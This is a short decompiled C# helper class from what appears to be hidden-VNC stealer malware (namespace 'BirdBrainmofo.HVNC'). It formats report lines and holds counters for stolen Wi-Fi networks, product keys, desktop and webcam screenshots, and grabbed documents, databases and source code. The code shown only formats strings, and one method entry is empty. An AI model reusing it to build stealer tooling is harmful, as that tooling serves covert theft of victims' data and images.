using System.Collections.Generic;

namespace BirdBrainmofo.HVNC.Helpers
{
	// Token: 0x020000D4 RID: 212
	internal sealed class Counter
	{
		// Token: 0x060008B5 RID: 2229 RVA: 0x0005D968 File Offset: 0x0005BB68
		public static string GetSValue(string application, bool value)
		{
			return value ? ("\n   ∟ " + application) : "";
		}

		// Token: 0x060008B6 RID: 2230 RVA: 0x0005D98C File Offset: 0x0005BB8C
		public static string GetIValue(string application, int value)
		{
			return (value != 0) ? ("\n   ∟ " + application + ": " + value) : "";
		}

		// Token: 0x060008B7 RID: 2231 RVA: 0x0005D9BC File Offset: 0x0005BBBC
		public static string GetLValue(string application, List<string> value, char separator = '∟')
		{
			value.Sort();
			return (value.Count != 0) ? string.Concat("\n   ", separator.ToString(), " ", application, ":\n\t\t", separator.ToString(), " ", string.Join("\n\t\t" + separator + " ", value)) : string.Concat("\n   ", separator.ToString(), " ", application, " (No data)");
		}

		// Token: 0x060008B8 RID: 2232 RVA: 0x0005DA70 File Offset: 0x0005BC70
		public static string GetBValue(bool value, string success, string failed)
		{
			return value ? ("\n   ∟ " + success) : ("\n   ∟ " + failed);
		}

		// Token: 0x060008B9 RID: 2233 RVA: 0x00006F52 File Offset: 0x00005152

        // Token: 0x04000708 RID: 1800
		public static int SavedWifiNetworks;

		// Token: 0x04000709 RID: 1801
		public static bool ProductKey;

		// Token: 0x0400070A RID: 1802
		public static bool DesktopScreenshot;

		// Token: 0x0400070B RID: 1803
		public static bool WebcamScreenshot;

		// Token: 0x0400070C RID: 1804
		public static int GrabberImages;

		// Token: 0x0400070D RID: 1805
		public static int GrabberDocuments;

		// Token: 0x0400070E RID: 1806
		public static int GrabberDatabases;

		// Token: 0x0400070F RID: 1807
		public static int GrabberSourceCodes;
	}
}
